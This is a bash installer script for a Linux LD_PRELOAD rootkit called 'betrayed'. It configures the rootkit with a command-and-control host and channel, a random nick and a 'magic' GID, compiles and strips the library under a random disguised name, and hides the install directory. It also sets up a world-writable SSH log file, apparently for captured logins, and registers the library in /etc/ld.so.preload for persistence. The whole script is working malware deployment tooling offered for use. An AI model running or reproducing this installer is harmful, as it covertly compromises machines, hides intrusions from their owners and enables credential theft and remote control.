#!/bin/bash

[ -f .ascii ] && cat .ascii
[ `id -u` != 0 ] && [ -z $COMPILE_ONLY ] && { echo "  [-] Not root."; exit; }
usage(){ echo "  [..] usage: $0 <host> '<channel>'"; exit; }
[ -z $1 ] && usage;
[ -z $2 ] && usage;

# comment this out/change to 0 and we won't create the fork
# process straight away.
FORK_IMMEDIATELY=1

CONF_H="src/config.h"
PRELOAD="/etc/ld.so.preload"

HOST="$1"
CHANNEL="$2"

random_soname(){ # $1 = desired length of name
    local names name name_length
    names=(`cat src/sonames.txt`)
    name_length=$1

    name=${names[$RANDOM % ${#names[@]}]}
    while [ ${#name} -gt $name_length ]; do name=${name::${#name}-1}; done
    while [ ${#name} -lt $name_length ]; do name+="a"; done

    echo -n "$name"
}

[ -z $NICK ] && NICK="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1)"
[ -z $MAGIC_GID ] && MAGIC_GID=$(cat /dev/urandom | tr -dc '1-9' | fold -w 5 | head -n 1)
[ -z $INSTALL_DIR ] && INSTALL_DIR="/lib/$NICK.$MAGIC_GID"
[ -z $SSH_LOGS ] && SSH_LOGS="$INSTALL_DIR/sshlogs"
[ -z $SONAME ] && SONAME="lib`random_soname 6`.so"
[ -z $SOPATH ] && SOPATH="$INSTALL_DIR/$SONAME"

hidepath(){ chown -h 0:$MAGIC_GID $1; }

writeconf(){
    cp $CONF_H ${CONF_H}.bak
    sed -i "s:_HOST_:$HOST:" $CONF_H
    sed -i "s:_CHANNEL_:$CHANNEL:" $CONF_H
    sed -i "s:_NICK_:$NICK:" $CONF_H
    sed -i "s:_MAGIC_GID_:$MAGIC_GID:" $CONF_H
    sed -i "s:_INSTALL_DIR_:$INSTALL_DIR:" $CONF_H
    sed -i "s:_SSH_LOGS_:$SSH_LOGS:" $CONF_H
    sed -i "s:_SONAME_:$SONAME:" $CONF_H
    sed -i "s:_SOPATH_:$SOPATH:" $CONF_H
}

compile_lib(){
    echo "  [..] configuring rootkit"
    writeconf

	echo "  [..] compiling rootkit"
	rm -rf *.so
	local LFLAGS="-ldl"
	local WFLAGS="-Wall"
	local FFLAGS="-fomit-frame-pointer -fPIC"
	gcc -std=gnu99 src/betrayed.c -O0 $WFLAGS $FFLAGS -shared $LFLAGS -Wl,--build-id=none -o $SONAME
    mv ${CONF_H}.bak $CONF_H
	strip -s $SONAME || { echo "  [-] couldn't strip $SONAME, exiting."; exit; }
	echo "  [+] rootkit compiled. ($SONAME $(ls -lhN $SONAME | awk '{ print $5 }'))"
}

install_btrayed(){
	echo "  [..] installing & setting up rootkit"
	mkdir -p $INSTALL_DIR || { echo " [-] failure making installation directory"; exit; }

    hidepath $INSTALL_DIR
    mv $SONAME $SOPATH && hidepath $SOPATH
    touch $SSH_LOGS && chmod 666 $SSH_LOGS && hidepath $SSH_LOGS
    touch $PRELOAD && hidepath $PRELOAD

    echo $SOPATH > $PRELOAD || { echo "  [-] couldn't write \$SOPATH to $PRELOAD"; exit; }
    [ "$FORK_IMMEDIATELY" == 1 ] && cat /dev/null # start fork process now

    echo "  [+] betrayed successfully installed"
    echo "  [+] eee $HOST ($CHANNEL)"
}

echo "  [+] host: $HOST"
echo "  [+] channel: $CHANNEL"
echo "  [+] nick: $NICK"
echo "  [+] magic GID: $MAGIC_GID"

compile_lib
[ -z $COMPILE_ONLY ] && install_btrayed
